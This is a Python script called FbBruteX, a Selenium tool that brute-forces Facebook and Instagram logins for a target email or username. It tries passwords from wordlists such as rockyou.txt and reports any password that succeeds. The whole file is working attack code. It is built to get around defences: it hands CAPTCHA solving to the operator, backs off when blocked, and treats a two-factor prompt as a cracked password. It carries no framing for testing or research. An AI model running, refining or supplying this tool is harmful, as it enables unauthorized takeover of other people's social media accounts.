import time
import sys
import itertools
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, Style, init

# Initialize colorama for color support in Windows
init(autoreset=True)

# Check Python version
if sys.version_info[0] != 3:
    print(Fore.RED + '''--------------------------------------
    REQUIRED PYTHON 3.x
    use: python3 FbBruteX.py
--------------------------------------
    ''')
    sys.exit()

# ASCII banner for FbBruteX
print(Fore.MAGENTA + Style.BRIGHT + '''
(                                                  )  
 )\ )     (      (                    )          ( /(  
(()/(   ( )\   ( )\   (       (    ( /(     (    )\()) 
 /(_))  )((_)  )((_)  )(     ))\   )\())   ))\  ((_)\  
(_))_| ((_)_  ((_)_  (()\   /((_) (_))/   /((_) __((_) 
| |_    | _ )  | _ )  ((_) (_))(  | |_   (_))   \ \/ / 
| __|   | _ \  | _ \ | '_| | || | |  _|  / -_)   >  <  
|_|     |___/  |___/ |_|    \_,_|  \__|  \___|  /_/\_\ 
                                                      
                 Written by CHEGEBB
''')

# Define the platform options
platforms = {
    '1': {
        'name': 'Facebook',
        'url': 'https://www.facebook.com/login.php',
        'login_field': 'email',
        'password_field': 'pass',
        'submit_button': 'login'
    },
    '2': {
        'name': 'Instagram',
        'url': 'https://www.instagram.com/accounts/login/',
        'login_field': 'username',
        'password_field': 'password',
        'submit_button': 'login'
    }
}

# Define the wordlist options
wordlists = {
    '1': 'rockyou.txt',
    '2': 'darkweb.txt',
    '3': 'bestof.txt',
    '4': 'top1000.txt',
    '5': 'easy_passwords.txt',
    '6': 'PhantomStrike.txt',
    '7': 'StormBreaker.txt',
}

# Select platform
print(Fore.YELLOW + "Select the platform to target:")
print(Fore.CYAN + "1. Facebook")
print(Fore.CYAN + "2. Instagram")
print(Fore.MAGENTA + "x. Exit")
platform_choice = input(Fore.CYAN + "Enter choice (1 for Facebook, 2 for Instagram): ").strip()

if platform_choice not in platforms:
    print(Fore.RED + "Invalid choice. Exiting...")
    sys.exit()

# Select wordlist
print(Fore.YELLOW + "\nSelect the password wordlist:")
print(Fore.CYAN + "1. rockyou.txt")
print(Fore.CYAN + "2. darkweb.txt")
print(Fore.CYAN + "3. bestof.txt")
print(Fore.CYAN + "4. top1000.txt")
print(Fore.CYAN + "5. easy_passwords.txt")
print(Fore.CYAN + "6. PhantomStrike.txt")
print(Fore.CYAN + "7. StormBreaker.txt")
print(Fore.MAGENTA + "x. Exit")
wordlist_choice = input(Fore.CYAN + "Enter choice (1-7): ").strip()

if wordlist_choice not in wordlists:
    print(Fore.RED + "Invalid choice. Exiting...")
    sys.exit()

# Get target email/username from the user
email = input(Fore.CYAN + 'Enter Target Email/Username: ').strip()
print(Fore.GREEN + "\nTarget Email:", email)
print(Fore.YELLOW + "\nInitializing FbBruteX...\n")

# Set up Selenium WebDriver
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

# Spinner for visual feedback
def spinner():
    spinner_cycle = itertools.cycle(['|', '/', '-', '\\'])
    while True:
        yield next(spinner_cycle)

spinner_gen = spinner()
attempt = 0

# Open password wordlist file with UTF-8 encoding
wordlist_file = wordlists[wordlist_choice]
try:
    with open(wordlist_file, 'r', encoding='utf-8') as file:
        passwords = file.readlines()
except FileNotFoundError:
    print(Fore.RED + f"Error: '{wordlist_file}' file not found.")
    sys.exit()
except UnicodeDecodeError:
    print(Fore.RED + f"Error: Cannot decode the file '{wordlist_file}'. Try using a different encoding or checking the file's contents.")
    sys.exit()

# Loop through each password in the list
for password in passwords:
    password = password.strip()
    attempt += 1
    
    # Skip short passwords
    if len(password) < 6:
        continue
    
    # Display each attempt with spinner animation
    print(Fore.CYAN + f"Attempt {attempt} - Trying: {password} " + next(spinner_gen), end="\r", flush=True)
    
    try:
        # Open the login page based on the platform selected
        driver.get(platforms[platform_choice]['url'])
        
        # Find the email and password fields and login button
        email_field = driver.find_element(By.NAME, platforms[platform_choice]['login_field'])
        password_field = driver.find_element(By.NAME, platforms[platform_choice]['password_field'])
        login_button = driver.find_element(By.NAME, platforms[platform_choice]['submit_button'])
        
        # Fill out the form
        email_field.send_keys(email)
        password_field.send_keys(password)
        login_button.click()
        
        time.sleep(3)  # Wait for page to load after submitting
        
        # Handle CAPTCHA or other security challenges (i.e., unclear text)
        if 'captcha' in driver.page_source or 'security check' in driver.page_source:
            print(Fore.YELLOW + "\nCAPTCHA detected. Please solve it within 30 seconds...")
            start_time = time.time()
            
            while time.time() - start_time < 30:
                # Check if the CAPTCHA is solved by the user
                if 'captcha' not in driver.page_source and 'security check' not in driver.page_source:
                    print(Fore.GREEN + "\nCAPTCHA solved successfully!")
                    break
                time.sleep(1)
            else:
                print(Fore.RED + "\n30 seconds passed without solving CAPTCHA. Continuing brute-forcing...")
                continue
        
        # Check for successful login by detecting specific page elements
        if 'Find Friends' in driver.page_source or 'Two-factor authentication' in driver.page_source or 'security code' in driver.page_source:
            print(Fore.GREEN + Style.BRIGHT + f'\n\nSuccess! Password found: {password}')
            break  # Exit loop if successful login is detected

    except Exception as e:
        # Display error message and continue
        print(Fore.YELLOW + f'\nError: {e}')
        print(Fore.MAGENTA + 'Pausing attempts for 5 minutes to avoid blocking...')
        time.sleep(300)  # 5-minute wait if an error occurs
    finally:
        time.sleep(0.1)  # Slight delay to avoid rapid-fire attempts

else:
    print(Fore.RED + "\nEnd of password list reached. Password not found.")

# Close file and the browser
driver.quit()

# Goodbye message with author's signature
print(Fore.BLUE + "\nThank you for using FbBruteX!")
print(Fore.CYAN + Style.BRIGHT + "Script written by CHEGEBB.")
